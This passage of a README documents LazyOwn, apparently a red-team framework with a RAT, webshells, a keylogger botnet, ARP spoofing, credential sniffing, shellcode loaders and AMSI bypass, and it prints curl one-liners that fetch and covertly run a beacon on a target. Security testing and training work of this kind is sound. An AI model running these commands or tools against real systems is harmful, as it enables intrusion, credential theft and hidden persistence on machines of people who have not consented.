gomulti_loader_windows

15. Adversary YAML.
───────────────────
amsi_c            implant_nim_nim  infect_c     pid_c  
implant_crypt_go  implant_rust_rs  persist_ps1  shell_c

16. Artificial Intelligence
───────────────────────────
ai_toggle

Uncategorized Commands
──────────────────────
addalias          gobuster_dns   ipy             ollama_enum   set          
alias             gobuster_http  listaliases     pop           shell        
edit              gobuster_web   macro           quit          shortcuts    
EOF               help           nikto_host      rrhost        subwfuzz_tool
ffuf_enumeration  history        notify          run_pyscript
ffuf_tool         ipp            nuclei_ad_http  run_script  

┌─[👤grisun0 (LazyOwn👽kali) ~/home/grisun0/LazyOwn][127.0.0.1][http://VariaType.htb] 🌐192.168.1.120 ✗ feature/lazyllmchat-assistant (🐍env)
└╼ $ 


```

## Tag in youtube
<https://www.youtube.com/hashtag/lazyown>

## Podcast
<https://www.youtube.com/watch?v=m4FtlhownvM&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ>

## DeepWiki
<https://deepwiki.com/grisuno/LazyOwn/>


```sh
LazyOwn> assign binary_name my_binary
LazyOwn> assign rhost 192.168.1.100
LazyOwn> assign api_key my_api_key
LazyOwn> run lazysearch
LazyOwn> run lazynmap
LazyOwn> exit
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)

For searching within the scraped database obtained from GTFOBins.

```sh
python3 lazysearch.py binario_a_buscar
```

## Searches with GUI
Additional Features and Enhancements:
AutocompleteEntry:

A filter has been added to remove None values from the autocomplete list.
New Attack Vector:

A "New Attack Vector" button has been added to the main interface.
Functionality has been implemented to add a new attack vector and save the updated data in Parquet files.
Export to CSV:

A "Export to CSV" button has been added to the main interface.
Functionality has been implemented to export DataFrame data to a user-selected CSV file.
Usage:

Add a New Attack Vector: Click the "New Attack Vector" button, fill in the fields, and save.
Export to CSV: Click the "Export to CSV" button and select the location to save the CSV file.
New Function scan_system_for_binaries:

Implements system-wide binary searches using the file command to determine if a file is binary.
Uses os.walk to traverse the file system.
Results are displayed in a new window within the GUI.
Button to Search for Binaries:

A "Search System for Binaries" button has been added to the main interface, which calls the scan_system_for_binaries function.
Note:

The is_binary function uses the Unix file command to determine if a file is a binary executable. If you are on a different operating system, you will need to adjust this method for compatibility.
This implementation can be resource-intensive as it traverses the entire file system. You may consider adding additional options to limit the search to specific directories or filter for certain file types.

```sh
python3 LazyOwnExplorer.py
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)



```sh
python3 lazyown.py
```

If you want to update, we proceed as follows:

```sh
cd LazyOwn
rm parquets/*.csv
rm parquets/*.parquet
./update_db.sh
```

## Use mode LazyOwn WebShells

LazyOwn Webshell Collection is a collection of webshells for our framework, which allows us to establish a webshell on the machine where we run LazyOwn using various programming languages. Essentially, LazyOwn Webshell raises a web server within the modules directory, making it accessible via a web browser. This allows us to both make the modules available separately through the web and access the cgi-bin directory, where there are four shells: one in Bash, another in Perl, another in Python, and one in ASP, in case the target is a Windows machine.

```sh
lazywebshell
```

y listo ya podemos acceder a cualquiera de estas url:

<http://localhost:8080/cgi-bin/lazywebshell.sh>

<http://localhost:8080/cgi-bin/lazywebshell.py>

<http://localhost:8080/cgi-bin/lazywebshell.asp>

<http://localhost:8080/cgi-bin/lazywebshell.cgi>

![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)

## Use Lazy MSFVenom to Reverse Shell

    Executes the `msfvenom` tool to generate a variety of payloads based on user input.

    This function prompts the user to select a payload type from a predefined list and runs the corresponding
    `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
    payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

    The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
    the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
    the function will also sign the APK and perform necessary post-processing steps.

    :param line: Command line arguments for the script.
    :return: None

```sh
run lazymsfvenom or venom
```
## Command & Control System
The Command & Control (C2) system enables remote operations through a server-client architecture with encrypted communications.

![image](https://github.com/user-attachments/assets/fe1bd558-8589-4d86-9d4b-c07118d2f119)


## Use Lazy PATH Hijacking

A file will be created in /tmp with the name binary_name set in the payload, initialized with gzip in memory, and using bash in the payload. To set the payload from the JSON, use the payload command to execute. Use:

```sh
lazypathhijacking
```

## Use mode LazyOwn RAT

![image](https://github.com/user-attachments/assets/b0653dd9-6a4f-42b5-b565-0ec4943acd69)


LazyOwn RAT is a simple yet powerful Remote Administration Tool. It features a screenshot function that captures the server's screen, an upload command that allows us to upload files to the compromised machine, and a C&C mode where commands can be sent to the server. It operates in two modes: client mode and server mode. There is no obfuscation, and the RAT is based on BasicRat. You can find it on GitHub at https://github.com/awesome-security/basicRAT and at https://github.com/hash3liZer/SillyRAT. Although the latter is much more comprehensive, I just wanted to implement screenshot capture, file uploads, and command sending. Perhaps in the future, I will add webcam viewing functionality, but that will come later.

```sh
usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
lazyownserver.py: error: the following arguments are required: --key

usage: lazyownclient.py [-h] --host HOST --port PORT --key KEY
lazyownclient.py: error: the following arguments are required: --host, --port, --key

LazyOwn> run lazyownclient
[?] lhost and lport and rat_key must be set

LazyOwn> run lazyownserver
[?] rhost and lport and rat_key must be set

luego los comandos son:

upload /path/to/file
donwload /path/to/file
screenshot
sysinfo
fix_xauth #to fix xauth xD
lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 ready to C&C
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)

## Use mode Lazy Meta Extract0r

LazyMeta Extract0r is a tool designed to extract metadata from various types of files, including PDF, DOCX, OLE files (such as DOC and XLS), and several image formats (JPG, JPEG, TIFF). This tool will traverse a specified directory, search for files with compatible extensions, extract the metadata, and save it to an output file.

[*] Iniciando: LazyMeta extract0r [;,;]

usage: lazyown_metaextract0r.py [-h] --path PATH
lazyown_metaextract0r.py: error: the following arguments are required: --path

```sh
python3 lazyown_metaextract0r.py --path /home/user
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)

## Use mode decrypt encrypt

A encryption method that allows us to both encrypt files and decrypt them if we have the key, of course.

![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)

```sh
encrypt path/to/file key # to encrypt
decrypt path/to/file.enc key #to decrypt
```

## Uso modo LazyNmap

![image](https://github.com/user-attachments/assets/89965c9e-836e-4402-9d0b-cb9d13bb9a26)


The use of Lazynmap provides us with an automated script for a target, in this case, 127.0.0.1, using Nmap. The script requires administrative permissions via sudo. It also includes a network discovery module to identify what is present in the IP segment you are in. Additionally, the script can now be called without parameters using the alias nmap or with the command run lazynmap.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)

```sh
./lazynmap.sh -t 127.0.0.1 # or in the cli just nmap
```

## Usage of LazyOwn GPT One Liner CLI Assistant and Researcher

Discover the revolution in automating pentesting tasks with the LazyOwn GPT One Liner CLI Assistant! This incredible script is part of the LazyOwn tool suite, designed to make your life as a pentester more efficient and productive.

🚀 Key Features:

Intelligent Automation: Leverages the power of Groq and advanced natural language models to generate precise and efficient commands based on your specific needs.
User-Friendly Interface: With a simple prompt, the assistant generates and executes one-liner scripts, drastically reducing the time and effort involved in creating complex commands.
Continuous Improvement: Continuously transforms and optimizes its knowledge base to provide you with the best solutions, adapting to each situation.
Simplified Debugging: Enable debug mode to obtain detailed information at every step, facilitating the identification and correction of errors.
Seamless Integration: Works effortlessly within your workspace, harnessing the power of the Groq API to deliver quick and accurate responses.
🔒 Security and Control:

Safe Error Handling: Intelligently detects and responds to execution errors, ensuring you maintain full control over each generated command.
Controlled Execution: Before executing any command, it requests your confirmation, giving you peace of mind knowing exactly what is being executed on your system.
🌐 Easy Configuration:

Set up your API key in seconds and start enjoying all the benefits offered by the LazyOwn GPT One Liner CLI Assistant. A quick start guide is available to help you configure and maximize the potential of this powerful tool.

🎯 Ideal for Pentesters and Developers:

Optimize Your Processes: Simplify and accelerate command generation in your security audits.
Continuous Learning: The knowledge base is constantly updated and improved, always providing you with the latest best practices and solutions.
With the LazyOwn GPT One Liner CLI Assistant, transform the way you work, making it faster, more efficient, and secure. Stop wasting time on repetitive and complex tasks, and focus on what truly matters: discovering and resolving vulnerabilities!

Join the pentesting revolution with LazyOwn and take your productivity to the next level!

[?] Usage: python lazygptcli.py --prompt "<your prompt>" [--debug]

[?] Options:

--prompt "The prompt for the programming task (required)."
--debug, -d "Enables debug mode to display debug messages."
--transform "Transforms the original knowledge base into an enhanced base using Groq."
[?] Ensure you configure your API key before running the script:
export GROQ_API_KEY=<your_api_key>
[->] Visit: https://console.groq.com/docs/quickstart (not a sponsored link)

Requirements:

Python 3.x
A valid Groq API key
Steps to Obtain the Groq API Key:
Visit Groq Console (https://console.groq.com/docs/quickstart) to register and obtain an API key.
```sh
export GROQ_API_KEY=<tu_api_key>
python3 lazygptcli.py --prompt "<tu prompt>" [--debug]
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)

## Usage of lazyown_bprfuzzer.py

Provide the arguments as specified by the script's requests: The script will require the following arguments:



usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                   [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]
--url: The URL to which the request will be sent (required).
--method: The HTTP method to use, such as GET or POST (optional, default: GET).
--headers: The request headers in JSON format (optional, default: {}).
--params: The URL parameters in JSON format (optional, default: {}).
--data: The form data in JSON format (optional, default: {}).
--json_data: The JSON data for the request in JSON format (optional, default: {}).
--proxy_port: The port for the internal proxy (optional, default: 8080).
-w, --wordlist: The path to the wordlist for fuzzing mode (optional).
-hc, --hide_code: The HTTP status code to hide in the output (optional).
Make sure to provide the required arguments to ensure the script runs correctly.
```sh
python3 lazyown_bprfuzzer.py --url "http://example.com" --method POST --headers '{"Content-Type": "LAZYFUZZ"}'
```

Form 2: Advanced Usage

If you wish to take advantage of the advanced features of the script, such as request replay or fuzzing, follow these steps:

Request Replay:

To utilize the request replay functionality, provide the arguments as indicated earlier.
During execution, the script will ask if you want to repeat the request. Enter 'y' to repeat or 'n' to terminate the repeater.
Fuzzing:

To use the fuzzing functionality, make sure to provide a wordlist with the -w or --wordlist argument.
The script will replace the word LAZYFUZZ in the URL and other data with the words from the provided wordlist.
During execution, the script will display the results of each fuzzing iteration.
These are the basic and advanced ways to use the lazyburp.py script. Depending on your needs, you can choose the method that best fits your specific situation.

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
    -hc 501
```

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \

```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
Note: To use the dictionary, run the following command within /usr/share/seclists:

```sh
now the command 'getseclist' do that automated.
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
&& unzip SecList.zip \
&& rm -f SecList.zip
```

## Usage of LazyOwn FTP Sniff Mode

This module is used to search for passwords on FTP servers across the network. Some may say that FTP is no longer used, but you would be surprised at the critical infrastructure environments I've seen with massive FTP services running on their servers. :)

```sh
assign device eth0
run lazyftpsniff
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859)

## Uso modo LazyReverseShell

Listen

```sh
nc -nlvp 1337 #o el puerto que escojamos
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)

para luego en la maquina victima

```sh
./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)

## Usage of Lazy Curl to Recon Mode

The module is located in the modules directory and is used as follows:

```sh
chmod +x lazycurl.sh
```

and then

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

Usage.

GET:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

POST:

```sh
./lazycurl.sh --mode POST --url http://10.10.10.10 --data "param1=value1&param2=value2"
```

TRACE:

```sh
./lazycurl.sh --mode TRACE --url http://10.10.10.10
```sh

File upload:

```sh
./lazycurl.sh --mode UPLOAD --url http://10.10.10.10 --file file.txt
```

wordlist bruteforce mode:

```sh
./lazycurl.sh --mode BRUTE_FORCE --url http://10.10.10.10 --wordlist /usr/share/wordlists/rockyou.txt
```

Make sure to adjust the parameters according to your needs and that the values you provide for the options are valid for each case.

## Usage of ARPSpoofing Mode

The script provides an ARP spoofing attack using Scapy. In the payload, you must set the lhost, rhost, and the device that you will use to perform the ARP spoofing.

```sh
assign rhost 192.168.1.100
assign lhost 192.168.1.1
assign device eth0
run lazyarpspoofing
```

## Usage of LazyGathering Mode

This script provides an X-ray view of the system in question where the tool is being executed, offering insights into its configuration and state.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)

```sh
run lazygath
```

## Usage of Lazy Own LFI RFI 2 RCE Mode

The LFI RFI 2 RCE mode is designed to test some of the more well-known payloads against the parameters specified in payload.json. This allows for a comprehensive assessment of Local File Inclusion (LFI), Remote File Inclusion (RFI), and Remote Code Execution (RCE) vulnerabilities in the target system.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)

```sh
payload
run lazylfi2rce
```





### Usage of LazyOwn Sniffer Mode

<https://www.youtube.com/watch?v=_-DDiiMrIlE>

The sniffer mode allows capturing network traffic through interfaces using the `-i` option, which is mandatory. There are many other optional settings that can be adjusted as needed.

#### Usage
```bash
usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
lazysniff.py: error: the following arguments are required: -i/--interface


![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)

To use the sniffer from the framework, you must configure the device with the command:

```sh
run lazysniff
or just
sniff
```

### Experimental Obfuscation Using PyInstaller

This feature is in experimental mode and does not work fully due to a path issue. Soon, it will support obfuscation using PyInstaller.


```sh
./py2el.sh
```

## Experimental NetBIOS Exploit

This feature is in experimental mode as it is not functioning yet... (coming soon, possibly an implementation of EternalBlue among other things...)


```sh
run lazynetbios
```

## Experimental LazyBotNet with Keylogger for Windows and Linux

This feature is in experimental mode, and the decryption of the keylogger logs is not functioning xD. Here we see for the first time in action the `payload` command, which sets all the configuration in our `payload.json`, allowing us to preload the configuration before starting the framework.


```sh
payload
run lazybotnet
```

## Interactive Menus

The script features interactive menus to select actions to be performed. In server mode, it displays relevant options for the victim machine, while in client mode, it shows options relevant to the attacking machine.

### Clean Interruption

The script handles the SIGINT signal (usually generated by Control + C) to exit cleanly.

## License

This project is licensed under the GPL v3 License. The information contained in GTFOBins is owned by its authors, to whom we are immensely grateful for the information provided.

## Acknowledgments ✌

A special thanks to [GTFOBins](https://gtfobins.github.io/) for the valuable information they provide and to you for using this project. Also, thanks for your support Tito S4vitar! who does an extraordinary job of outreach. Of course, I use the `extractPorts` function in my `.zshrc` :D, thanks to deepwiki to help us with doc. ( https://deepwiki.com/grisuno/LazyOwn/ ), thanks to plaintext who does an extraordinary job of outreach and we adopted PTMultiTools it's very impresive

### Thanks to pwntomate 🍅

An excellent tool that I adapted a bit to work with the project; all credits go to its author honze-net Andreas Hontzia. Visit and show love to the project: <https://github.com/honze-net/pwntomate>

### Thanks to Sicat 🐈

An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. <https://github.com/justakazh/sicat/>

### Thanks to josefcohernandez

For identifying and reporting the Docker build failures caused by the repo.charm.sh outage and the Python version incompatibility. His report led to the fixes in `lazyown-docker/Dockerfile`.

### Thanks to EQSTLab (via yym8538)

For two critical security advisories that helped us harden the framework and fix serious vulnerabilities. Their responsible disclosure makes LazyOwn safer for the entire community.

## BlackSandBeacon — Linux BOF

**BlackSandBeacon** brings Beacon Object File (BOF) extensibility to Linux for the
first time in an open-source C2 framework. No commercial C2 (including Cobalt Strike)
offers Linux BOF support.

### What is Linux BOF?

On Windows, BOFs are position-independent PE COFF objects loaded by the beacon at
runtime, giving operators an in-memory plugin system without spawning new processes.
BlackSandBeacon ports this model to Linux:

- BOFs compile as **position-independent ELF shared objects** (`.so`) with GCC
  (`-shared -fPIC -nostartfiles`).
- The beacon loads them at runtime via `dlopen` — no disk writes after delivery,
  no new process, no shell.
- The **`datap` API** (`BeaconDataParse`, `BeaconDataInt`, `BeaconDataExtract`,
  `BeaconPrintf`, `BeaconOutput`) is source-compatible with the Windows BOF contract,
  so existing BOF authors can port by replacing Win32 calls with Linux syscalls or
  libc equivalents.
- Advanced BOFs can use **direct syscalls via inline assembly** or `io_uring` for
  kernel interaction without libc linking.

### Deployment via LazyOwn

```bash
# 1. Build and stage the beacon
(LazyOwn) > blacksandbeacon

# 2. Deliver to target (command runs on target)
curl -sk "http://{lhost}:{lport}/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &

# 3. Build and stage the BOF loader
(LazyOwn) > blacksandbeacon_bof

# 4. Deliver the BOF loader to a live session
curl -sk "http://{lhost}:{lport}/bof_loader" -o /tmp/.bof && chmod +x /tmp/.bof && /tmp/.bof
```

### Porting a Windows BOF to Linux

```c
// Replace Win32 API calls with direct syscalls or libc equivalents.
// The datap API remains identical.
#include "beacon.h"

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *target = BeaconDataExtract(&parser, NULL);
    // Linux: use syscall(SYS_open, ...) instead of CreateFile
    BeaconPrintf(CALLBACK_OUTPUT, "target: %s\n", target);
}
```

Compile: `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`

### Adoption gap this closes

| Capability | Cobalt Strike | Sliver | Havoc | LazyOwn + BlackSandBeacon |
|---|---|---|---|---|
| Windows BOF | Yes | No | No | Yes (via `beacon` addon) |
| Linux BOF | **No** | **No** | **No** | **Yes** |
| ARM BOF | No | No | No | Planned (`blackzincbeacon`) |
| Open source | No | Yes | Yes | Yes |

## Related Projects

LazyOwn ships as the "all-in-one" front of a small ecosystem of focused
red-team tools. Each project below stands on its own and can be wired into
LazyOwn through `lazyaddons/*.yaml`, the C2 implant pipeline, or the MCP
`lazyown_palette --info` view (which exposes the graphify-derived `calls`
and `related` neighbours of every command).

### Lightweight beacons (C / ASM)

Drop-in replacements for the bundled Go beacon when you need a smaller
footprint or per-architecture artefacts:

- **[beacon](https://github.com/grisuno/beacon)** — minimalist Windows beacon in C with BOF support via Early Bird APC injection and NT Native API calls. Pairs with LazyOwn's malleable C2 profile. Wired in via `lazyaddons/beacon.yaml`.
- **[blacksandbeacon](https://github.com/grisuno/blacksandbeacon)** — Linux-native beacon in C with first-class **Linux BOF (Beacon Object File)** support via ELF shared-object injection and direct syscalls. BOFs are loaded at runtime through a `dlopen` runtime — the same extensibility model as Windows BOF but targeting Linux kernel internals. **No commercial C2 framework (including Cobalt Strike) offers Linux BOF support.** Wired in via `lazyaddons/blacksandbeacon.yaml`; BOF loader via `lazyaddons/blacksandbeacon_bof.yaml`.
- **[blackzincbeacon](https://github.com/grisuno/blackzincbeacon)** — ARM build of the same family, for embedded / IoT engagements.

### Lightweight C2 frameworks

Alternative C2 surfaces that speak the same beacon protocol as `lazyc2.py`
or that can serve as a teamserver back-end:

- **[BlackObsidianC2](https://github.com/grisuno/BlackObsidianC2)** — small, fast Go C2 server intended as a stripped-down companion to `lazyc2.py`.
- **[LazyOwnBT](https://github.com/grisuno/LazyOwnBT)** — Bluetooth / proximity-aware C2 PoC; useful when the engagement scope explicitly covers RF.

### AI / orchestration

Drop into LazyOwn through MCP, the `toposwarm` lazyaddon, or directly:

- **[toposwarm](https://github.com/grisuno/toposwarm)** — natural-language router on top of the LazyOwn command catalogue; ships as both a lazyaddon and a Claude Code skill.
- **[LazyOwnOpenCodeAdapter](https://github.com/grisuno/LazyOwnOpenCodeAdapter)** — bridge between LazyOwn and OpenCode-style coding agents.

### Loaders, shellcode runners and post-exploitation

Used both by humans through pwntomate `.tool` files and by the autonomous
daemon when the reactive selector recommends an in-memory technique:

- **[gomulti_loader](https://github.com/grisuno/gomulti_loader)** — multi-platform Go shellcode loader (Linux + Windows). Wired in via `lazyaddons/gomulti_loader_linux.yaml` and `gomulti_loader_windows.yaml`.
- **[win_shellcode](https://github.com/grisuno/win_shellcode)** — collection of Windows shellcode templates ready to be linked from a beacon stub.
- **[ejecutarShellcode](https://github.com/grisuno/ejecutarShellcode)** — minimal "execute-this-shellcode" loaders for quick PoCs.
- **[ShellcodeFluctuation_crosscompile](https://github.com/grisuno/ShellcodeFluctuation_crosscompile)** — cross-compilable port of the ShellcodeFluctuation memory-encryption trick.
- **[LazyLoader](https://github.com/grisuno/LazyLoader)** — generic loader scaffold designed to be extended per engagement.
- **[OverRide](https://github.com/grisuno/OverRide)** — DLL hijack / DLL search-order-override toolkit for Windows persistence.
- **[ShadowLink](https://github.com/grisuno/ShadowLink)** — link-time / symbol-rewrite tooling for Linux ELF stagers.
- **[netsh_helper_dll](https://github.com/grisuno/netsh_helper_dll)** — `netsh` helper-DLL persistence template for Windows.

### Defensive bypass / instrumentation

- **[amsi](https://github.com/grisuno/amsi)** — AMSI bypass research and PoCs; invoked from LazyOwn payloads when AV/EDR is the limiting factor.

### Exploits and CVE PoCs

LazyOwn already vendors several recent kernel-class PoCs through the addon
system (`lazyaddons/copyfail.yaml`, `lazyaddons/dirtyfrag.yaml`,
`lazyaddons/CVE-2022-22077.yaml`, `lazyaddons/CVE_2025_24071_PoC.yaml`,
`lazyaddons/ebird3.yaml`). The original repositories are listed here for
auditability and citation:

- **[CVE-2022-22077](https://github.com/grisuno/CVE-2022-22077)** — RTCore64.sys arbitrary R/W IOCTL — used by the LazyOwn BYOVD chain.
- **[copy-fail-CVE-2026-31431](https://github.com/grisuno/copy-fail-CVE-2026-31431)** — next-gen Dirty Pipe variant. Backed by the `copyfail` lazyaddon.
- **[ebird3](https://github.com/grisuno/ebird3)** — Early-Bird APC injection + NT Native API loader; produces stealthy in-memory Windows payloads.

> **Want to add yours?** Drop a `lazyaddons/<name>.yaml` describing
> `repo_url`, `install_command` and `execute_command`; LazyOwn will pick it
> up automatically and surface it through the MCP `lazyown_palette` view.

## Abstract

LazyOwn is a framework that streamlines its workflow and automates many tasks and tests through aliases and various tools, functioning like a Swiss army knife with multipurpose blades for hacking xD.

## Lazyducky_digispark

![LazyOwn](https://github.com/user-attachments/assets/b7e8c257-c0de-4033-bf4b-57ebc87dcb97)

      Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.

        This method checks if Arduino CLI and Micronucleus are installed on the system.
        If they are not available, it installs them. It then compiles a Digispark sketch
        and uploads the generated .hex file to the Digispark device.

        The method performs the following actions:
        1. Checks for the presence of Arduino CLI and installs it if not available.
        2. Configures Arduino CLI for Digispark if not already configured.
        3. Generates a reverse shell payload and prepares the sketch for Digispark.
        4. Compiles the prepared Digispark sketch using Arduino CLI.
        5. Checks for the presence of Micronucleus and installs it if not available.
        6. Uploads the compiled .hex file to the Digispark device using Micronucleus.

        Args:
            line (str): Command line input provided by the user, which may contain additional parameters.

        Returns:
            None: The function does not return any value but may modify the state of the system
                by executing commands.


## Star History

<a href="https://www.star-history.com/#grisuno/LazyOwn&Date">
 <picture>
   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=grisuno/LazyOwn&type=Date&theme=dark" />
   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=grisuno/LazyOwn&type=Date" />
   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=grisuno/LazyOwn&type=Date" />
 </picture>
</a>

# Documentation by readmeneitor.py

Documentation automatically created by the script `readmeneitor.py` created for this project; maybe one day it will have its own repo, but for now, I don't see it as necessary.

## ReadMenator now have a repository

[https://github.com/grisuno/ReadMenator](https://github.com/grisuno/ReadMenator)

# Legal disclaimer:
Usage of LazyOwn RedTeam Framework for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.


---

## Reference Documentation

| Document | Contents |
|----------|----------|
| [`COMMANDS.md`](COMMANDS.md) | Full 333+ command reference (auto-generated) |
| [`CHEATSHEET.md`](CHEATSHEET.md) | ~40 frequent commands by user goal |
| [`ESSENTIALS.md`](ESSENTIALS.md) | 18 core commands for 80% of use |
| [`CHANGELOG.md`](CHANGELOG.md) | Full project changelog |
| [`QUICKSTART.md`](QUICKSTART.md) | First-time setup and onboarding |
| [`CLAUDE.md`](CLAUDE.md) | Architecture and developer reference |
| [`AGENTS.md`](AGENTS.md) | AI agent context for Hermes/Claude |
| [`soul.md`](soul.md) | Operating philosophy |

*README auto-generated sections (UTILS, COMMANDS, CHANGELOG) have been moved to standalone files for maintainability.*
